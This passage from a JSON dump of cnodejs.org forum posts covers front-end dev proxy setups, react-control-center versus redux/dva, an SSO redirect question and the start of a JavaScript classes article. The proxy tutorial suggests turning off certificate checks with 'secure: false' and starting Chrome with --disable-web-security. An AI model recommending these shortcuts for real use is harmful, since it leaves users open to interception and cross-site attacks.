会一统江湖？","last_reply_at":"2019-01-25T06:56:51.922Z","good":false,"top":false,"reply_count":24,"visit_count":3079,"create_at":"2019-01-09T11:17:42.743Z","author":{"loginname":"tmirun","avatar_url":"https://avatars1.githubusercontent.com/u/8052536?v=4&s=120"}},{"id":"5c208b6776c4964062a1d147","author_id":"59a6b400d97b7e23082428d0","tab":"ask","content":"<div class=\"markdown-text\"><p>我用 window.onbeforeunload 事件，当进入首页直接点击关闭按钮，不会提示是否离开，只有使用了路由跳转之后才可以。\n有没有大神做过类似的功能，就是在浏览器关闭的时候提示：是否离开</p>\n</div>","title":"react 中怎么监听浏览器关闭事件","last_reply_at":"2019-01-25T03:27:45.896Z","good":false,"top":false,"reply_count":10,"visit_count":1340,"create_at":"2018-12-24T07:31:51.327Z","author":{"loginname":"Sunny-zz","avatar_url":"https://avatars1.githubusercontent.com/u/31389080?v=4&s=120"}},{"id":"5b2ce85857137f22415c4e16","author_id":"55d120f3b25bd72150842d85","tab":"share","content":"<div class=\"markdown-text\"><p>–读《<a href=\"https://juejin.im/post/5b01336af265da0b8a67e5c9\">谁说前端不需要懂-Nginx反向代理与负载均衡</a>》有感</p>\n<p>读了上文发现内容虽然还是挺好的，但看完，为啥要懂nginx呀，负载均衡和前端哪里有什么半毛钱关系了，没说清楚呀。</p>\n<p>当然这个面向前端做个科普文让大家多知道一项只是还是不错的，文章拉到最后面看了下作者的使用场景举例说起个 host 给让产品走查。\n这不就是起个webserver 容器么，和反向代理么？</p>\n<p>这篇内容很热，结合最近聊天群里总是有人问起，我想前端还有很多人想知道这方面知识的，所以在这里也科普下，常用的代理方式有哪些。</p>\n<h2>招式一、 使用 http-server 模块进行代理</h2>\n<p>熟悉 nodejs 的朋友应该知道有个非常好和强大的工具模块 <a href=\"https://github.com/indexzero/http-server\">http-server</a>\n这是一枚小火箭能帮助你直冲云霄，使用方式如下：</p>\n<p>首先需要安装 nodejs （对于nodejs 合格的前端应该都安装上了吧？这里就不复述了）。</p>\n<p>安装全局模块</p>\n<pre class=\"prettyprint\"><code> npm install http-server -g\n</code></pre><p>然后到你需要运行展示的 html 资源目录执行</p>\n<pre class=\"prettyprint\"><code>http-server -P http:&#x2F;&#x2F;www.your-backend.com&#x2F;api\n</code></pre><p><strong><a href=\"http://www.your-backend.com/api\">http://www.your-backend.com/api</a></strong> 是你后端反向代理的接口地址，你需要修改成你自己的。</p>\n<p>然后你就可以使用  <a href=\"http://localhost:8080\">http://localhost:8080</a> 进行访问了（如果 8080 端口不被占用掉的话，若占用了你可以 -p 指定其他端口 ），是不是超级 easy?\n更多参数可以查询官方文档 <a href=\"https://github.com/indexzero/http-server\">http-server</a>。</p>\n<h2>招式二、使用 webpack 配置代理</h2>\n<p>webpack 对于前端来说是个强大的工具, 除了能够帮助你打包和启动调试服务器外, 代理的功能也值得你了解下。\n惯例上官网资料<a href=\"https://webpack.js.org/configuration/dev-server/#devserver-proxy\">文档地址</a></p>\n<p>最简方式:</p>\n<pre class=\"prettyprint\"><code>module.exports = {\n  &#x2F;&#x2F;...\n  devServer: {\n    proxy: {\n      &#x27;&#x2F;api&#x27;: &#x27;http:&#x2F;&#x2F;localhost:3000&#x27;\n    }\n  }\n};\n</code></pre><p>上述配置将自动把 /api 这一地址的访问转请求到 <a href=\"http://localhost:3000\">http://localhost:3000</a> 从而起到了代理的作用。</p>\n<p>如果你的规则需要去掉 api 前缀，你可以使用重写地址的方式。</p>\n<pre class=\"prettyprint\"><code>module.exports = {\n  &#x2F;&#x2F;...\n  devServer: {\n    proxy: {\n      &#x27;&#x2F;api&#x27;: {\n        target: &#x27;http:&#x2F;&#x2F;localhost:3000&#x27;,\n        pathRewrite: {&#x27;^&#x2F;api&#x27; : &#x27;&#x27;}\n      }\n    }\n  }\n};\n</code></pre><p>你可能还遇到 https 的安全问题触发未验证的证书错误, 则你可以简单的加上 secure: false 来处理</p>\n<pre class=\"prettyprint\"><code>module.exports = {\n  &#x2F;&#x2F;...\n  devServer: {\n    proxy: {\n      &#x27;&#x2F;api&#x27;: {\n        target: &#x27;https:&#x2F;&#x2F;other-server.example.com&#x27;,\n        secure: false\n      }\n    }\n  }\n};\n</code></pre><p>有时你不想代理所有的请求。可以基于一个函数的返回值绕过代理。\n在函数中你可以访问请求体、响应体和代理选项。必须返回 false 或路径，来跳过代理请求。\n例如：对于浏览器请求，你想要提供一个 HTML 页面，但是对于 API 请求则保持代理。你可以这样做：</p>\n<pre class=\"prettyprint\"><code>proxy: {\n  &quot;&#x2F;api&quot;: {\n    target: &quot;http:&#x2F;&#x2F;localhost:3000&quot;,\n    bypass: function(req, res, proxyOptions) {\n      if (req.headers.accept.indexOf(&quot;html&quot;) !== -1) {\n        console.log(&quot;Skipping proxy for browser request.&quot;);\n        return &quot;&#x2F;index.html&quot;;\n      }\n    }\n  }\n}\n</code></pre><p>多个路径的代理</p>\n<pre class=\"prettyprint\"><code>proxy: [{\n  context: [&quot;&#x2F;auth&quot;, &quot;&#x2F;api&quot;],\n  target: &quot;http:&#x2F;&#x2F;localhost:3000&quot;,\n}]\n</code></pre><p>总之 webpack 提供了多种灵活的方式, 相信大多时候都能满足到你到要求。</p>\n<h2>招式三、使用 nodejs 的 node-http-proxy 模块来处理</h2>\n<p><a href=\"https://github.com/nodejitsu/node-http-proxy\">node-http-proxy</a> 提供了一个可以<strong>编程模式</strong>的代理环境，如果你有很特殊的需求如session、cookie 已绑定的域处理成其他的域什么，或是内容还要转换处理等，你可以用这个方式来处理复杂的 hacker.</p>\n<p>如增加特殊请求头；</p>\n<pre class=\"prettyprint\"><code>var http = require(&#x27;http&#x27;),\n    httpProxy = require(&#x27;http-proxy&#x27;);\n \nvar proxy = httpProxy.createProxyServer({});\n\n \nproxy.on(&#x27;proxyReq&#x27;, function(proxyReq, req, res, options) {\n  proxyReq.setHeader(&#x27;X-Special-Proxy-Header&#x27;, &#x27;foobar&#x27;);\n});\n\nvar server = http.createServer(function(req, res) {\n  &#x2F;&#x2F; You can define here your custom logic to handle the request\n  &#x2F;&#x2F; and then proxy the request.\n  proxy.web(req, res, {\n    target: &#x27;http:&#x2F;&#x2F;127.0.0.1:5060&#x27;\n  });\n});\n\nconsole.log(&quot;listening on port 5050&quot;)\nserver.listen(5050);\n</code></pre><p><a href=\"https://github.com/nodejitsu/node-http-proxy\">更多介绍看官网文档</a></p>\n<h2>招式四、使用框架自带代理方式如 angular 的 proxy.</h2>\n<p>angular 的 proxy 写法形式和 webpack 基本一样, 你需要一份如下的配置文件 proxy.conf.json\n我的开源项目 <a href=\"https://github.com/vellengs/typerx/blob/master/packages/client/proxy.conf.json\">typerx</a>采用的就是这种方式</p>\n<pre class=\"prettyprint\"><code>{\n    &quot;&#x2F;api&quot;: {\n        &quot;target&quot;: &quot;http:&#x2F;&#x2F;localhost:5400&#x2F;&quot;,\n        &quot;secure&quot;: false\n    },\n    &quot;&#x2F;user&quot;: {\n        &quot;target&quot;: &quot;http:&#x2F;&#x2F;localhost:5400&#x2F;&quot;,\n        &quot;secure&quot;: false\n    },\n    &quot;&#x2F;uploads&quot;: {\n        &quot;target&quot;: &quot;http:&#x2F;&#x2F;localhost:5400&#x2F;&quot;,\n        &quot;secure&quot;: false\n    }\n}\n</code></pre><p>配置完成之后使用 proxy-config 参数指定 proxy.conf.json 即可调用代理配置</p>\n<pre class=\"prettyprint\"><code> ng serve --proxy-config proxy.conf.json\n</code></pre><p><a href=\"https://github.com/angular/angular-cli/blob/master/docs/documentation/stories/proxy.md\">其他更多方式</a> , 如果你看完更多方式是不是觉得和 webpack 是一样的呢，实际上他就是 webpack 哈？</p>\n<h2>招式五、实际上这个不是代理，但是也能解决你的跨域问题。</h2>\n<pre class=\"prettyprint\"><code>open -n &#x2F;Applications&#x2F;Google\\ Chrome.app&#x2F; --args --disable-web-security --user-data-dir=&#x2F;Users&#x2F;your&#x2F;path&#x2F;\n</code></pre><h2>还有个方式当然就是 nginx 啦</h2>\n<p>你可以继续了解他 <a href=\"https://juejin.im/post/5b01336af265da0b8a67e5c9\">谁说前端不需要懂-Nginx反向代理与负载均衡</a></p>\n</div>","title":"谁说前端需要懂 - Nginx 了","last_reply_at":"2019-01-25T03:22:37.298Z","good":false,"top":false,"reply_count":18,"visit_count":4329,"create_at":"2018-06-22T12:15:20.149Z","author":{"loginname":"vellengs","avatar_url":"https://avatars1.githubusercontent.com/u/5743338?v=4&s=120"}},{"id":"5c4550ed6955112b9943730d","author_id":"550973933135610a365b01fa","tab":"share","content":"<div class=\"markdown-text\"><h1>Ant Design Pro Powered by <a href=\"https://github.com/fantasticsoul/react-control-center\">react-control-center</a></h1>\n<h3>cc版本的ant-design-pro来了,<a href=\"https://github.com/fantasticsoul/rcc-antd-pro\">ant-design-pro powered by C_C</a></h3>\n<hr>\n<h4>我们先看看redux是如何工作起来的，在来细比较<code>cc</code>和<code>redux</code>的最大的不同之处</h4>\n<h5>\b<code>redux</code>如何工作？订阅<code>redux</code>单一状态树里的部分数据源，让组件被<code>redux</code>接管,从而实现当订阅的数据源发生变化时才触发渲染的目的</h5>\n<ul>\n<li>我们知道，在<code>redux</code>世界里，可以通过一个配置了<code>mapStateToProps</code>的<code>connect</code>高阶函数去包裹一个组件，能够得到一个高阶组件，该高阶组件的<code>shouldComponentUpdate</code>会被redux接管，通过浅比较this.props!==nextProps来高效的决定被包裹的组件是否要触发新一轮的渲染，之所以能够这么直接进行浅比较，是因为在<code>redux</code>世界的<code>reducer</code>里,规定了如果用户改变了一个状态某一部分值，一定要返回一个新的完整的状态，如下所示，是一个传统的经典的<code>connect</code>和<code>reducer</code>写法示例。</li>\n</ul>\n<pre class=\"prettyprint\"><code>&#x2F;** code in component&#x2F;Foo.js, connect现有组件，配置需要观察的&#96;store&#96;树中的部分state，绑定&#96;action&#96; *&#x2F;\nclass Foo extends Component{\n  &#x2F;&#x2F;...\n  render(){\n    return (\n      &lt;div&gt;\n        &lt;span&gt;{this.props.fooNode.foo}&lt;&#x2F;span&gt;\n        &lt;button onClick={this.props.actions.incFoo}&gt;incFoo&lt;&#x2F;button&gt;\n      &lt;&#x2F;div&gt;\n    );\n  }\n}\nexport default connect(\n  state =&gt; ({\n    list: state.list,\n    fooNode: state.fooNode,\n  }),\n  dispatch =&gt; ({\n    actions: bindActionCreators(fooActionCreator, dispatch)\n  })\n)(Foo)\n\n&#x2F;** code in action&#x2F;foo.js, 配置action纯函数 *&#x2F;\nexport const incFoo = () =&gt;{\n  return {type:&#x27;INC_FOO&#x27;};\n}\n\n&#x2F;** code in reducer&#x2F;foo.js, 定义reducer函数 *&#x2F;\nfunction getInitialState() {\n  return {\n    foo: 1,\n    bar: 2,\n  };\n}\n\nexport default function (state = getInitialState(), action) {\n  switch (action.type) {\n    case &#x27;INC_FOO&#x27;: {\n      state.foo = state.foo + 1;\n      return {...state};\n    }\n    default:{\n      return state;\n    }\n      \n  }\n}\n</code></pre><ul>\n<li>在<code>ant-design-pro</code>的<code>dva</code>世界里，<code>dva</code>将<code>redux</code>做了一层浅封装，省去了繁琐的\b定义<code>action</code>函数，<code>connect</code>时要绑定<code>action</code>函数等过程,给了一个命名空间的概览，一个命名空间下可以定义<code>state</code>、<code>effects</code>、<code>reducers</code>这些概念，组件内部<code>dispatch</code>的<code>action</code>对象的<code>type</code>的格式形如<code>${namespaceName}/${methodName}</code>,这样<code>dva</code>就可以通过解析用户调用<code>dispatch</code>函数时派发的<code>action</code>对象里的<code>type</code>值而直接操作<code>effects</code>里的函数，在<code>effects</code>里的某个函数块内处理完相应逻辑后，用户可以调用<code>dva</code>提供给用户的<code>put</code>函数去触发<code>reducers</code>里的对应函数去合成新的state，尽管流程上简化了不少，但是归根到底还是不能脱离<code>redux</code>的核心理念，需要合成一个新的<code>state</code>! 以下示例是ant-design-pro里一个经典的变种<code>redux</code>流程写法.</li>\n</ul>\n<pre class=\"prettyprint\"><code>&#x2F;** code in component&#x2F;Foo.js, connect现有组件，配置需要观察的&#96;store&#96;树中的部分state *&#x2F;\nimport { connect } from &#x27;dva&#x27;;\n\nclass Foo extends Component{\n  &#x2F;&#x2F;...\n  render(){\n    return (\n      &lt;div&gt;\n        &lt;span&gt;{this.props.fooNode.foo}&lt;&#x2F;span&gt;\n        &lt;button onClick={()=&gt;this.props.dispatch({type:&#x27;fooNode&#x2F;incFoo&#x27;, payload:2})}&gt;incFoo&lt;&#x2F;button&gt;\n      &lt;&#x2F;div&gt;\n    );\n  }\n}\nexport default connect(\n  state =&gt; ({\n    list: state.list,\n    fooNode: state.fooNode,\n  })\n)(Foo)\n\n&#x2F;** code in models&#x2F;foo.js *&#x2F;\nimport logService from &#x27;@&#x2F;services&#x2F;log&#x27;;\n\nexport default {\n  namespace: &#x27;fooNode&#x27;,\n\n  state: {\n    foo: 1,\n    bar: 1,\n  },\n\n  effects: {\n    *query({ payload:incNumber }, { call, put }) {\n      yield call(logService, incNumber);\n      yield put({\n        type: &#x27;saveFoo&#x27;,\n        payload: incNumber,\n      });\n    },\n  },\n\n  reducers: {\n    saveFoo(state, action) {\n      return { ...state, foo:action.payload };\n    },\n  },\n};\n\n</code></pre><h5>\b<code>cc</code>如何工作？订阅<code>react-control-center</code>的部分数据源，当这些部分数据源任意一个部分发生变化时，<code>cc</code>主动通知该组件触发渲染</h5>\n<ul>\n<li><code>cc</code>和<code>redux</code>最大的不同就是，<code>cc</code>接管了所有<code>cc组件</code>的具体\b引用，当用户的<code>react组件</code>注册成为<code>cc组件时</code>，<code>cc</code>的<code>register</code>函数需要用户配置<code>ccClassKey</code>、<code>module</code>、<code>sharedStateKeys</code>、<code>globalStateKeys</code>、<code>stateToPropMapping</code>等参数来告诉<code>cc</code>怎么对这些具体的引用进行分类，然后\b<code>cc</code>就能够高效并精确的通知哪些\b<code>cc组件实例</code>能够发生新一轮的渲染。</li>\n<li>实际上当你在<code>cc组件实例</code>\u001c里调用<code>this.setState</code>时,效果和原有的<code>this.setState</code>毫无差别，但是其实<code>cc组件实例</code>\u001c的<code>this.setState</code>已近不再是原来的了，这个函数已经被<code>cc</code>接管并做了相当多的工作，原来的已经被<code>cc</code>保存为<code>reactSetState</code>,当你调用<code>cc组件实例</code>\u001c的<code>this.setState</code>，发生的事情大概经过了以下几步\n<img src=\"https://user-gold-cdn.xitu.io/2019/1/21/1686e03f133218ad?w=845&amp;h=784&amp;f=png&amp;s=76088\" alt></li>\n<li>因为此文主要是介绍和证明\b<a href=\"https://github.com/fantasticsoul/react-control-center\">cc</a> 的弱入侵性和灵活性，而<code>ant-design-pro</code>里的组件的<code>state</code>并不需要被<code>接管</code>，所以我们下面的示例写法仅仅使用<code>cc.connect</code>函数将组件的状态和<code>cc.store</code>打通，这些状态并非从<code>state</code>里取，而是从<code>this.$$propState</code>里获取，下面的示例注释掉的部分是原<code>dva</code>写法,新增的是<code>cc</code>的写法.</li>\n<li>(备注：此处仅仅展示关键代码详细代码<a href=\"https://github.com/fantasticsoul/rcc-antd-pro/blob/master/src/routes/Dashboard/Analysis.js\">见</a> )</li>\n</ul>\n<pre class=\"prettyprint\"><code>&#x2F;** code in src&#x2F;routes&#x2F;Dashboard&#x2F;Analysis.js, *&#x2F;\nimport React, { Component } from &#x27;react&#x27;;\n&#x2F;&#x2F; import { connect } from &#x27;dva&#x27;;\nimport cc from &#x27;react-control-center&#x27;;\n\n&#x2F;&#x2F; @connect(({ chart, loading }) =&gt; ({\n&#x2F;&#x2F;   chart,\n&#x2F;&#x2F;   loading: loading.effects[&#x27;chart&#x2F;fetch&#x27;],\n&#x2F;&#x2F; }))\n@cc.connect(&#x27;Analysis&#x27;, {\n  &#x27;chart&#x2F;*&#x27;: &#x27;&#x27;,\n  &#x27;form&#x2F;*&#x27;: &#x27;&#x27;, &#x2F;&#x2F; this is redundant here, just for show isPropStateModuleMode&#x27;s effect\n}, { isPropStateModuleMode: true })\nexport default class Analysis extends Component {\n  state = {\n    loading: true,\n    salesType: &#x27;all&#x27;,\n    currentTabKey: &#x27;&#x27;,\n    rangePickerValue: [],\n  }\n\n  componentDidMount() {\n    this.$$dispatch({\n      module: &#x27;chart&#x27;, type: &#x27;fetch&#x27;\n    }).then(() =&gt; this.setState({ loading: false }));\n    &#x2F;&#x2F; this.props.dispatch({\n    &#x2F;&#x2F;   type: &#x27;chart&#x2F;fetch&#x27;,\n    &#x2F;&#x2F; }).then(() =&gt; this.setState({ loading: false }));\n  }\n\n  componentWillUnmount() {\n    &#x2F;&#x2F; const { dispatch } = this.props;\n    &#x2F;&#x2F; dispatch({\n    &#x2F;&#x2F;   type: &#x27;chart&#x2F;clear&#x27;,\n    &#x2F;&#x2F; });\n    &#x2F;&#x2F; this.$$dispatch({ module: &#x27;chart&#x27;, type: &#x27;clear&#x27; });\n  }\n\n  handleRangePickerChange = (rangePickerValue) =&gt; {\n    this.setState({\n      rangePickerValue,\n    });\n\n    &#x2F;&#x2F; this.props.dispatch({ type: &#x27;chart&#x2F;fetchSalesData&#x27;});\n    this.$$dispatch({ module: &#x27;chart&#x27;, type: &#x27;fetchSalesData&#x27; });\n  }\n\n  selectDate = (type) =&gt; {\n    this.setState({\n      rangePickerValue: getTimeDistance(type),\n    });\n\n    &#x2F;&#x2F; this.props.dispatch({ type: &#x27;chart&#x2F;fetchSalesData&#x27; });\n    this.$$dispatch({ module: &#x27;chart&#x27;, type: &#x27;fetchSalesData&#x27; });\n  }\n\n\n  render() {\n    const { rangePickerValue, salesType, currentTabKey, loading } = this.state;\n    console.log(&#x27;%c@@@ Analysis !!!&#x27;, &#x27;color:green;border:1px solid green;&#x27;);\n    const {\n      visitData,\n      visitData2,\n      salesData,\n      searchData,\n      offlineData,\n      offlineChartData,\n      salesTypeData,\n      salesTypeDataOnline,\n      salesTypeDataOffline,\n    } = this.$$propState.chart;\n    &#x2F;&#x2F; } = this.props.chart;\n    \n  }\n}\n\n</code></pre><ul>\n<li>models的替换</li>\n</ul>\n<pre class=\"prettyprint\"><code>&#x2F;** 原来的model，code in src&#x2F;models&#x2F;chart *&#x2F;\nexport default {\n  namespace: &#x27;chart&#x27;,\n\n  state: {\n    visitData: [],\n    visitData2: [],\n    salesData: [],\n    searchData: [],\n    offlineData: [],\n    offlineChartData: [],\n    salesTypeData: [],\n    salesTypeDataOnline: [],\n    salesTypeDataOffline: [],\n    radarData: [],\n  },\n\n  effects: {\n    *fetch(_, { call, put }) {\n      const response = yield call(fakeChartData);\n      yield put({\n        type: &#x27;save&#x27;,\n        payload: response,\n      });\n    },\n    *fetchSalesData(_, { call, put }) {\n      const response = yield call(fakeChartData);\n      yield put({\n        type: &#x27;save&#x27;,\n        payload: {\n          salesData: response.salesData,\n        },\n      });\n    },\n  },\n\n  reducers: {\n    save(state, { payload }) {\n      return {\n        ...state,\n        ...payload,\n      };\n    },\n    setter(state, { payload }) {\n      return {\n        ...state,\n        ...payload,\n      };\n    },\n    clear() {\n      return {\n        visitData: [],\n        visitData2: [],\n        salesData: [],\n        searchData: [],\n        offlineData: [],\n        offlineChartData: [],\n        salesTypeData: [],\n        salesTypeDataOnline: [],\n        salesTypeDataOffline: [],\n        radarData: [],\n      };\n    },\n  },\n};\n\n&#x2F;** cc定义的model，code in src&#x2F;cc-models&#x2F;chart  *&#x2F;\nfunction getInitialState() {\n  return {\n    wow: &#x27;wow&#x27;,\n    visitData: [],\n    visitData2: [],\n    salesData: [],\n    searchData: [],\n    offlineData: [],\n    offlineChartData: [],\n    salesTypeData: [],\n    salesTypeDataOnline: [],\n    salesTypeDataOffline: [],\n    radarData: [],\n  }\n}\n\nexport default {\n  module:&#x27;&#x27;,\n  state:getInitialState(),\n  reducer:{\n    *fetch() {\n      const response = yield fakeChartData();\n      return response;\n    },\n    *fetchSalesData() {\n      const response = yield fakeChartData();\n      const salesData = response.salesData;\n      return { salesData };\n    },\n    clear(){\n      const originalState = getInitialState();\n      return originalState;\n    }\n  }\n}\n</code></pre><h5>由上可\b以发现，cc里的<code>setState</code>需要的<code>state</code>和<code>dispatch</code>对应函数返回的<code>state</code>，都是react鼓励的<code>部分state</code>,你需要改变哪一部分的<code>state</code>，就仅仅把这一部分<code>state</code>交给<code>cc</code>就好了。同时cc也兼容<code>redux</code>生态的思路，一切共享的数据源都从<code>props</code>注入，而非存储在<code>state</code>里。</h5>\n<h5>因为所有的<code>改变state的行为</code>都会经过<code>$$changeState</code>,所以状态的变化依然是可预测的同时也是可以追踪的，后面cc的迭代版本里会利用<code>immutable.js</code>,来让状态树可以回溯，这样<code>cc</code>就可以实现<code>时间旅行</code>的功能了，敬请期待.</h5>\n<hr>\n<h5>注意哦! 现在我仅仅先把两个路由级别的组件交给cc处理, ant pro任然完美工作起立, 这两个路由文件是 <code>routes/Dashboard/Analysis.js</code> 和 <code>routes/Forms/Basic.js</code>.</h5>\n<h5>\b同时我也新增了一个路由组件 <code>routes/Dashboard/CCState.js</code> 来展示cc强大能力, 这个组件还没有彻底写完，将会被持续更新的, 就像 <a href=\"https://github.com/fantasticsoul/rcc-simple-demo\">我为cc专门写的引导示例一样</a>，将会很快会为大家带来更多的精彩演示</h5>\n<hr>\n<h3>希望我亲爱的朋友\b们花一点时间了解<a href=\"https://github.com/fantasticsoul/react-control-center\">react-control-center</a>并探索它更多有趣的玩法</h3>\n</div>","title":"ant-design-pro powered by react-control-center C_C","last_reply_at":"2019-01-25T02:31:49.086Z","good":false,"top":false,"reply_count":6,"visit_count":704,"create_at":"2019-01-21T04:56:13.882Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c485f9d3b948a2b4ab70e6f","author_id":"59f6eaf40c9678bc54ede390","tab":"ask","content":"<div class=\"markdown-text\"><p>学校有个项目，多方合作的那种，需要各个系统之间单点登录，我们负责登录入口，预想的方案是：</p>\n<ol>\n<li>其他系统在localStorage或cookie中没有检测到token，跳转到我们系统进行登录，跳转的url带地址参数</li>\n<li>我们系统验证成功后，将token携带于headers中，通过重定向请求发给1步骤中带的地址</li>\n</ol>\n<p>我们系统前端采用vue + axios，后端nodejs\n现情况问题如下：\n通过编写另一简单服务(主要是res.sendFile发送html页面)，该页面中通过a标签跳转，示例如下：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;http:&#x2F;&#x2F;127.0.0.1:12577&#x2F;login?redirect=http:&#x2F;&#x2F;localhost:18118&#x2F;index&quot;&gt;点击跳转&lt;&#x2F;a&gt;\n</code></pre><p>vue前端项目也就是上面的12577中，通过this.$route.query.redirect拿到需要跳转的地址，login请求进行后端验证：\n<img src=\"//static.cnodejs.org/FnoZ3j_wa6a1dxn9UsmQerUPF1G7\" alt=\"image.png\"></p>\n<p>验证通过后发送direct请求，进行服务端重定向（target为目标地址）：\n<img src=\"//static.cnodejs.org/FmIl3LwmZwAPIBKr9YHzY_eDl0Kv\" alt=\"image.png\"></p>\n<p>浏览器中可以看到发出了另外的跳转请求并获取到了内容：\n<img src=\"//static.cnodejs.org/Fimb1p2D-22vfbxHPAmz45L_uMn2\" alt=\"image.png\"></p>\n<p>但浏览器url并没有改变，怀疑是测试页面的res.sendFile的原因，所以拿了其他小伙伴的前端项目测试，也是上面的步骤，最后跳转请求报类似跨域的错：\n<img src=\"//static.cnodejs.org/Fjqg6IlqyCF-0LqLiP3i5nb8a5Ym\" alt=\"image.png\"></p>\n<p>另外，尝试res.location(target)与res.redirect(target)，和上面情况一致</p>\n<p>疑问：</p>\n<ol>\n<li>此种方式是否正确？能否满足跨系统间传递token？如不正确，能否告知已经验证通过的方案？</li>\n<li>测试页面的res.sendFile是否不合适此时的情景？</li>\n<li>重定向请求跳转到前端为何也会报跨域的问题？\n谢谢！！</li>\n</ol>\n</div>","title":"node+vue+axios重定向问题","last_reply_at":"2019-01-24T14:34:31.508Z","good":false,"top":false,"reply_count":4,"visit_count":1116,"create_at":"2019-01-23T12:35:41.375Z","author":{"loginname":"ZCZ12138","avatar_url":"https://avatars3.githubusercontent.com/u/32564579?v=4&s=120"}},{"id":"5c491fd36955112b9943842c","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> 深入JS系列15。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000017992671\">深入类和继承内部原理 + Babel和TypeScript 之间转换</a></li>\n<li>作者：<a href=\"https://segmentfault.com/a/1190000017794020\">前端小智</a></li>\n</ul>\n<p><strong><a href=\"https://www.fundebug.com/\">Fundebug</a>经授权转载，版权归原作者所有。</strong></p>\n<p>这是专门探索 JavaScript 及其所构建的组件的系列文章的第 15 篇。</p>\n<p>如果你错过了前面的章节，可以在这里找到它们：</p>\n<ul>\n<li><a href=\"https://segmentfault.com/a/11900000173529413\">JavaScript 是如何工作的：引擎，运行时和调用堆栈的概述！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017369465\">JavaScript 是如何工作的：深入V8引擎&amp;编写优化代码的5个技巧！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017392370\">JavaScript 是如何工作的：内存管理+如何处理4个常见的内存泄漏 !</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017419328\">JavaScript 是如何工作的：事件循环和异步编程的崛起+ 5种使用 async/await 更好地编码方式！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017448270\">JavaScript 是如何工作的：深入探索 websocket 和HTTP/2与SSE +如何选择正确的路径！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017485968\">JavaScript 是如何工作的：与 WebAssembly比较 及其使用场景 !</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017578650\">JavaScript 是如何工作的：Web Workers的构建块+ 5个使用他们的场景!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017749922\">JavaScript 是如何工作的：Service Worker 的生命周期及使用场景!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017794020?_ea=6014340#articleHeader0\">JavaScript 是如何工作的：Web 推送通知的机制!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017832686\">JavaScript是如何工作的：使用 MutationObserver 跟踪 DOM 的变化!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017872125#articleHeader0\">JavaScript是如何工作的：渲染引擎和优化其性能的技巧!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017903157\">JavaScript是如何工作的：深入网络层 + 如何优化性能和安全!</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017927665\">JavaScript是如何工作的：CSS 和 JS 动画底层原理及如何优化它们的性能！</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000017961297\">JavaScript是如何工作的：解析、抽象语法树（AST）+ 提升编译速度5个技巧!</a></li>\n</ul>\n<p>现在构建任何类型的软件项目最流行的方法这是使用类。在这篇文章中，探讨用 JavaScript 实现类的不同方法，以及如何构建类的结构。首先从深入研究原型工作原理，并分析在流行库中模拟基于类的继承的方法。 接下来是讲如何将新的语法转制为浏览器识别的语法，以及在 Babel 和 TypeScript 中使用它来引入ECMAScript 2015类的支持。最后，将以一些在 V8 中如何本机实现类的示例来结束本文。</p>\n<h3>概述</h3>\n<p>在 JavaScript 中，没有基本类型，创建的所有东西都是对象。例如，创建一个新字符串:</p>\n<pre class=\"prettyprint language-javascript\"><code>const name = &quot;SessionStack&quot;;\n</code></pre><p>接着在新创建的对象上调用不同的方法:</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(a.repeat(2)); &#x2F;&#x2F; SessionStackSessionStack\nconsole.log(a.toLowerCase()); &#x2F;&#x2F; sessionstack\n</code></pre><p>与其他语言不同，在 JavaScript 中，字符串或数字的声明会自动创建一个封装值的对象，并提供不同的方法，甚至可以在基本类型上执行这些方法。</p>\n<p>另一个有趣的事实是，数组等复杂类型也是对象。如果检查数组实例的类型，你将看到它是一个对象。列表中每个元素的索引只是对象中的属性。当通过数组中的索引访问一个元素时，实际上是访问了数组对象的一个 <code>key</code> 值，并得到 <code>key</code> 对应的值。从数据的存储方式看时，这两个定义是相同的:</p>\n<pre class=\"prettyprint language-javascript\"><code>let names = [“SessionStack”];\n\nlet names = {\n  “0”: “SessionStack”,\n  “length”: 1\n}\n</code></pre><p>因此，访问数组中的元素和对象的属性耗时是相同的。我(本文作者)通过多次的努力才发现这一点的。就是不久，我(本文作者)不得不对项目中的一段关键代码进行大规模优化。在尝试了所有简单的可选项之后，最后用数组替换了项目中使用的所有对象。理论上，访问数组中的元素比访问哈希映射中的键要快且对性能没有任何影响。在 JavaScript中，这两种操作都是作为访问哈希映射中的键来实现的，并且花费相同的时间。</p>\n<h3>使用原型模拟类</h3>\n<p>一般的想到对象时，首先想到的是类。我们大都习惯于根据类及其之间的关系来构建应用程序。尽管 JavaScript 中的对象无处不在，但该语言并不使用传统的基于类的继承，相反，它依赖于<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Details_of_the_Object_Model\">原型</a>来实现。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-23-01.png\" alt></p>\n<p>在 JavaScript 中，每个对象通过原型连接着另一个对象。当尝试访问对象上的属性或方法时，首先从对象本身开始查找，如果没有找到任何内容，则在对象的原型中继续查找。</p>\n<p>从一个简单的例子开始:</p>\n<pre class=\"prettyprint language-javascript\"><code>function Component(content) {\n  this.content = content;\n}\n\nComponent.prototype.render = function() {\n    console.log(this.content);\n}\n</code></pre><p>在 <code>Component</code> 的原型上添加 <code>render</code> 方法，因为希望 <code>Component</code> 的每个实例都能有 <code>render</code> 方法。<code>Component</code> 任何实例调用此方法时，首先将在实例本身中执行查找，如果没有，接着从它的原型中执行查找。</p>\n<p><img src=\"https://image.fundebug.com/2019-01-23-02.png\" alt></p>\n<p>接着引入一个新的子类：</p>\n<pre class=\"prettyprint language-javascript\"><code>function InputField(value) {\n 